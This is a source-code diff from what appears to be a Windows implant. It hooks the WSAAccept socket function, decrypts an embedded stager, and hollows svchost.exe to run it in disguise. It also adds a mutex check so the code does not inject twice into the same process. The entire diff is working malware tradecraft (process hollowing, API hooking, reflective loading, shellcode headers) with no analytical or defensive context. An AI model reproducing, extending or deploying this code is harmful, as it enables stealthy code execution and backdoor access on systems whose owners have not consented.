@@ -30,6 +30,7 @@
 #include <windows.h>
 #include <hooker.h>
 #include <time.h>
+#include "vr-config.h"
 #include "../shared/shellcode.h"
 #include "../shared/process_hollowing.h"
 #include "../shared/resources.h"
@@ -39,7 +40,6 @@
 #include "../shared/debug.h"
 #include "../shared/ReflectiveLoader.h"
 #include "../shared/payload.h"
-#include "../config.h"
 #include "stager.exe.h"
 
 typedef SOCKET(WSAAPI*WSAAccept_t)(SOCKET, struct sockaddr*, LPINT, LPCONDITIONPROC, DWORD_PTR);
@@ -124,7 +124,11 @@ SocketAction handle_socket(SOCKET s)
         if (!resource_open(stager, RSRC_STAGER_DATA, sizeof(RSRC_STAGER_DATA), RSRC_STAGER_KEY, RSRC_STAGER_KEY_SIZE))
             break;
 
-        stl::string mapping_name = "Global\\" + deterministic_uuid(gts_shared_memory_name);
+        hollow_process_startup_info info{};
+        stl::string host = GetFolderPath(CSIDL_SYSTEM) + "\\svchost.exe";
+        pi = hollow_process(stager.data(), host.c_str(), &info);
+
+        stl::string mapping_name = "Global\\" + deterministic_uuid(combine_hash(gts_shared_memory_name, pi.dwProcessId));
         
         // We use shared memory for passing information to the child because it is trivial. Much easier than
         // say a named pipe.
@@ -140,10 +144,6 @@ SocketAction handle_socket(SOCKET s)
 
         // Ensure "completed" flag is zero
         InterlockedExchange((volatile long*)shared_memory, 0);
-
-        hollow_process_startup_info info{};
-        stl::string host = GetFolderPath(CSIDL_SYSTEM) + "\\svchost.exe";
-        pi = hollow_process(stager.data(), host.c_str(), &info);
 
         if (!pi.hThread)
             break;
@@ -190,9 +190,33 @@ SOCKET WSAAPI WSAAccept_hook(SOCKET s, struct sockaddr* addr, LPINT addrlen, LPC
     return accepted_socket;
 }
 
+DWORD WINAPI lock_thread(LPVOID is_locked_void)
+{
+    unsigned& is_locked = *(unsigned*)is_locked_void;
+    HANDLE hMutex = mutex_lock(combine_hash(vr_mutant_gts, GetCurrentProcessId()));
+    if (hMutex == 0)
+        return 1;
+    // Wait indefinitely. If this thread exits lock mutex will be abandoned.
+    for (;;) Sleep(10000);
+    ReleaseMutex(hMutex);
+    return 0;
+}
+
 int main()
 {
     deterministic_uuid_seed = get_machine_hash();
+    unsigned is_locked = 0;
+    HANDLE hThread = CreateThread(nullptr, 0, &lock_thread, &is_locked, 0, nullptr);
+
+    DWORD exit_code = 0;
+    if (WaitForSingleObject(hThread, 3000) != WAIT_TIMEOUT && GetExitCodeThread(hThread, &exit_code) && exit_code == 1)
+    {
+        LOG_ERROR("gts terminates because process %d is already injected.", GetCurrentProcessId());
+        return 0;
+    }
+    else
+        LOG_DEBUG("gts runs in process %d", GetCurrentProcessId());
+
     HMODULE ws2_32 = GetModuleHandleW(L"ws2_32.dll");
     if (ws2_32)
     {
